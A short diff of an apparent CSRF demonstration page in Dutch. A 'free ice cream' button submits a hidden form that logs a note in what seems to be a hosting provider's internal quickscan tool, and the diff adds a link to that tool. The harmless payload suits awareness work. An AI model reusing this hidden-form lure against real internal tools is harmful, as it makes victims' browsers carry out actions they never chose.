@@ -11,6 +11,7 @@ te komen waar we het heen moeten sturen.
 <input type="hidden" name="json" value='{"class":"note","object":"frisseshizzle.nl","object_type":"domein","source":"quickscan","tag":"default","text":"Ik ben er in getrapt! Dit is gelogged in de quickscan middels CSRF."}' />
 <input type="submit" value="Bestel gratis ijs">
 </form>
+<a href="https://office.byte.nl/quickscan/?domein=frisseshizzle.nl">qs</a>
 <div style="margin: 10em;"></div>
 <h1>Cross Site Request Forgery</h1>
 <img src="csrf.png">
